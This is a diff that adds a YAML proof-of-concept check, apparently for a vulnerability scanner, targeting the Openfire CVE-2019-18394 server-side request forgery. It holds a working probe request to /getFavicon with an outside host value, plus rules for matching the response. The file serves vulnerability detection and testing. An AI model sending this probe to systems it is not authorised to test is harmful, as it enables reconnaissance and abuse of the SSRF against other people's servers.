@@ -1,0 +1,18 @@
+detail:
+  author: su(https://suzzz112113.github.io/#blog)
+  links:
+  - https://www.cnvd.org.cn/patchInfo/show/192993
+  - https://www.cnblogs.com/potatsoSec/p/13437713.html
+expression: r0()
+manual: true
+name: poc-yaml-openfire-cve-2019-18394-ssrf
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("image/x-icon")
+      && response.body.bcontains(bytes("baidu.com"))
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /getFavicon?host=baidu.com/?
+transport: http
